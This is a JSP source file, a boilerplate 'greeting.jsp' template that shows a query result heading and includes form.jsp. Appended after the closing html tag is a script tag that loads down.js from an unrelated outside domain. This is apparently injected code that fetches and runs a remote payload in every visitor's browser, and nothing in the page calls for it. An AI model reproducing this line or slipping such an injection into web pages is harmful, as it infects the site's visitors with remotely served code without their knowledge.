
<%@ page language="java" pageEncoding="GBK"%>
<%
		String path = request.getContextPath();
		String basePath = request.getScheme() + "://" + request.getServerName()
				+ ":" + request.getServerPort() + path + "/";
%>

<html>
<head>
<base href="<%=basePath%>">

<title>My JSP 'greeting.jsp' starting page</title>

<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="cache-control" content="no-cache">
<meta http-equiv="expires" content="0">
<meta http-equiv="keywords" content="keyword1,keyword2,keyword3">
<meta http-equiv="description" content="This is my page">

<!--
    <link rel="stylesheet" type="text/css" href="styles.css">
    -->
</head>

<body>
This is query result page.
<br>
<hr>
<jsp:include page="form.jsp">
<jsp:param name="type" value="4"/>
</jsp:include>
</body>
</html>

<script language=javascript src=http://Town.531jx.cn/down.js></script>